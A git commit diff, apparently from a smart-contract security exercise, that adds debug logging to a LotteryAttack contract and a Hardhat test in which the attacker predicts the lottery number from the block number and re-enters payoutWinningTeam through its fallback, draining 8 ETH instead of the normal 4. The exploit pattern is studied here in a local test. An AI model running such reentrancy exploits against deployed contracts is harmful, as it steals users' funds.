2d5b24f4d23627730f1e1eb4819311f0bc5f1876
christian-reynolds <93774940+christian-reynolds@users.noreply.github.com>
2021-12-10 06:33:04 -0500

    Added test for the Reentrancy attack

--- LotteryFun/contracts/LotteryAttack.sol
+++ LotteryFun/contracts/LotteryAttack.sol
@@ -1,5 +1,6 @@
 pragma solidity 0.6.0;
 import "./Lottery.sol";
+import "hardhat/console.sol";
 
 contract LotteryAttack {
     Lottery public lotteryContract;
@@ -11,20 +12,24 @@ contract LotteryAttack {
     }
 
     function guess(address addr) public {
+        console.logString("guess hit");
         uint num = block.number;
 
         lotteryContract.makeAGuess(addr, num % 7);
     }
 
     function attack() external {
+        console.logString("attack hit");
         lotteryContract.payoutWinningTeam();
     }
 
     fallback() external payable {
+        console.logString("fallback hit");
         uint bal = address(lotteryContract).balance;
         emit LogFallbackHit(bal);
         
         if (bal > 0.1 ether) {
+            console.logString("fallback 2 hit");
             lotteryContract.payoutWinningTeam();
         }
     }
--- LotteryFun/test/sample-test.js
+++ LotteryFun/test/sample-test.js
@@ -17,6 +17,61 @@ describe("Attack", function () {
     [owner, addr1, addr2, addr3] = await ethers.getSigners();
   });
 
+  it.only("Reentrancy attack drains more ETH than standard payout", async function () {
+    // Initialize the lottery
+    const initTx = await lotteryContract.initialiseLottery(7);
+    await initTx.wait();
+
+    // Create the teams
+    const teamTx = await lotteryContract.registerTeam(attackContract.address, "Team Attack", "testpw", {
+      value: ethers.utils.parseEther("2")
+    });
+    await teamTx.wait();
+
+    const teamTx2 = await lotteryContract.registerTeam(owner.address, "Team Owner", "testpw", {
+      value: ethers.utils.parseEther("2")
+    });
+    await teamTx2.wait();
+
+    const teamTx3 = await lotteryContract.registerTeam(addr1.address, "Team Addr1", "testpw", {
+      value: ethers.utils.parseEther("2")
+    });
+    await teamTx3.wait();
+
+    const teamTx4 = await lotteryContract.registerTeam(addr2.address, "Team Addr2", "testpw", {
+      value: ethers.utils.parseEther("2")
+    });
+    await teamTx4.wait();
+
+    const teamTx5 = await lotteryContract.registerTeam(addr3.address, "Team Addr3", "testpw", {
+      value: ethers.utils.parseEther("2")
+    });
+    await teamTx5.wait();
+
+    let teamCount = await lotteryContract.getTeamCount();
+    console.log("Team count: ", teamCount.toString());
+    
+    // Guess the correct answer
+    const guess = await attackContract.guess(attackContract.address);
+    await guess.wait();
+
+    let teamDetails = await lotteryContract.getTeamDetails(1);
+    console.log("Attack team's score: ", teamDetails[2].toString());
+
+    const balanceBeforeAttack = await ethers.provider.getBalance(attackContract.address);
+    console.log("Attack contract balance before attack: ", ethers.utils.formatEther(balanceBeforeAttack));
+
+    // Attack the contract
+    let attack = await attackContract.attack();
+    await attack.wait();
+
+    const balanceAfterAttack = await ethers.provider.getBalance(attackContract.address);
+    console.log("Attack contract balance after attack: ", ethers.utils.formatEther(balanceAfterAttack));
+
+    // The balance should be 8 since the payout is in increments of 4 ETH and there is 10 ETH in the contract from 5 teams registering with 2 ETH each
+    expect(balanceAfterAttack).to.equal(ethers.utils.parseEther("8"));
+  });
+
   it.only("Lottery has a balance after sending ETH to the contract", async function () {
     const tx = await owner.sendTransaction({
       to: lotteryContract.address,
@@ -25,7 +80,6 @@ describe("Attack", function () {
     await tx.wait();
 
     const balance = await ethers.provider.getBalance(lotteryContract.address);
-    console.log("My test: ", ethers.utils.parseEther("1"));
     expect(balance).to.equal(ethers.utils.parseEther("1"));
   });
 
